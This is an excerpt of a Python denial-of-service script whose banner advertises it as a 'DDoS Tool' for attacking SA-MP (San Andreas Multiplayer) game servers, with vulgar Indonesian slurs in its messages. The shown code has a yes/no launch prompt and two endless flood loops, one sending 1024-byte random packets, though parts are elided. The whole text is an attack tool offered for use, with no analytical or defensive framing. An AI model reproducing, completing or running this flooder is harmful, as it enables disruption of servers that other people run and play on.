...
============================================
 [!] DDoS Tools Has Been Created
 [@] DDoS Tools For Attack SA-MP Server
 [^] Note : Dont Abuse Ye Ngentot""")

print ("Type : DDoS KONTOL")
...
choice = str(input(" Gas Maniezz?(y/n):"))
...
def run():
    ...
    while True:
        try:
            ...
            s.close()
            print("[LOL] BAYAR ANJNG")
 
def run2():
    data = random._urandom(1024)
    i = random.choice(("[PKET!!]","[PAKET!!]","[PAKET!!]"))
    while True:
        try:
